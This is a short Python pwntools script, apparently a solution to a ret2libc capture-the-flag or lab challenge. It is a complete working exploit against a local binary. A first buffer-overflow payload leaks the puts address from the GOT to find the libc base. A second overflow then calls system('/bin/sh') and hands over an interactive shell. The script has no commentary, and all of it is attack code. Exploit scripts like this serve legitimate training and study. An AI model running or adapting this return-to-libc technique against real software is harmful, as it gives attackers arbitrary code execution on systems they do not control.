from pwn import *
from LibcSearcher import LibcSearcher as LC

p = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')
libc = ELF('./libc.so.6')
puts_plt = ret2libc3.plt['puts']
gets_plt = ret2libc3.plt['gets']
main = ret2libc3.symbols['main']
puts_got = ret2libc3.got['puts']
buf2 = 0x0804A080
pop_ebx = 0x0804841d
payload = flat(
    [
        'a'*0x70,
        puts_plt,
        main,
        puts_got,
    ]
)
p.sendlineafter('Can you find it !?',payload)
puts_got = u32(p.recvline()[0:4])
base_addr = puts_got - libc.symbols['puts']
sys_addr = base_addr + libc.symbols['system']
binsh = base_addr + next(libc.search('/bin/sh'))
payload = flat(['a'*104,sys_addr,0xdeadbeef,binsh])
p.sendline(payload)
p.interactive()